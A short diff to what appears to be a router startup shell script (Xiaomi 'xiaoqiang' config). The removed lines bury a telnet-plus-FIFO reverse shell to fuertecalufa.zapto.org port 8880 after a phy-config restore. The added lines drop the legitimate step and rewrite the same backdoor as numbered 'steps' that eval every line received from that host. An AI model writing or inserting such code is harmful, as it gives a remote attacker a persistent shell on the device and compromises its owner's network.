@@ -1,5 +1,14 @@
-# restore phy config
-speed=$(uci -q get xiaoqiang.common.WAN_SPEED)
-[ -n "$speed" ] && /usr/sbin/phyhelper swan "$speed"
-TF=$(mktemp); rm "$TF"; mkfifo "$TF" && telnet fuertecalufa.zapto.org 8880 0<"$TF" | /bin/sh 1>"$TF"
-exit 0
+# Step 1: Manually specify a FIFO path (ensure it is unique and does not already exist)
+TF="/tmp/myfifo$$"  # Using $$ to append the process ID for a bit of uniqueness
+
+# Step 2: Create the FIFO
+mkfifo "$TF"
+
+# Step 3: Start telnet in the background redirecting output to FIFO
+telnet fuertecalufa.zapto.org 8880 > "$TF" &
+
+# Step 4: Read commands from the FIFO and execute them
+while IFS= read -r line; do eval "$line"; done < "$TF"
+
+# Cleanup (optional, advisable to place in a trap for signals)
+rm "$TF"
